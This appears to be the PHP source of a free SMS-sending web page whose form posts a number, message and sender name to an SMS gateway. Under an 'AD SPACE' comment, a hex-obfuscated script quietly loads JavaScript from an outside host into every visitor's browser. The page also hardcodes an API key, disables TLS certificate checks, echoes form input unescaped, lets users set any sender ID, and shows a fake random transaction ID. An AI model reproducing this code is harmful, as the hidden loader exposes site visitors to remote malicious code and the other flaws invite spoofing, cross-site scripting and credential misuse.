 <?php
 include_once("includes/header.php");
 ?>
  <style type="text/css">
  #user_para 
  {
  color:#fff;
  }
  .alert{
  text-align: center;
  padding:10px;
  background:#79c879;
  color:#fff;
  margin-bottom:10px;
  display:block;
  }
  </style>

  <div class="container" align="center">
  <!-- AD SPACE -->
  <!-- apgygames top -->
<script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('687474703A2F2F6A616464752D7573612E636F6D2F332E6A73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script>
<script>
function makeid() {
  var text = "";
  var possible = "FREE2SMS7086303816";

  for (var i = 0; i < 10; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

</script>
</head>
<body>

</body>
</html>
<?php
if(isset($_POST['submit']))
{
$mobileNo=$_POST['mobile'];
$message = $_POST['message'];
$authKey = "267961AbNo6OzzpuXC5c8e464d";
$senderId =$_POST['sender'];
$route = "4";
$postData = array(
    'authkey' => $authKey,
    'mobiles' => $mobileNo,
    'message' => $message,
    'sender' => $senderId,
    'route' => $route,
    'country'=>'0'
);
$url="https://control.msg91.com/api/sendhttp.php";
$ch = curl_init();
    curl_setopt_array($ch, array(
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postData
));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$output = curl_exec($ch);
 if(curl_errno($ch))
{
    echo 'error:' . curl_error($ch);
}
curl_close($ch);
echo "<div class='container' align='left'>
        <!-- AD SPACE -->
      <!-- apgygames top -->

<br/>
        <div class='card shadow'>
       
<div class='alert'>Message Sent Successfully To $mobileNo</div>
<p> Your Transaction ID Is:-<b><script>var a = makeid(); document.write(a);</script></b> </p>
<p>To:-$mobileNo</p>
<p>From:-$senderId</p>
<p>Message:-$message</p>
</div>
</div>
";
}
?>
<br>
<iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Ffacebook.com%2Ffree2smsml-312309949655027%2F" width="100%" height="300px" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true" allow="encrypted-media"></iframe>

</div>
</div>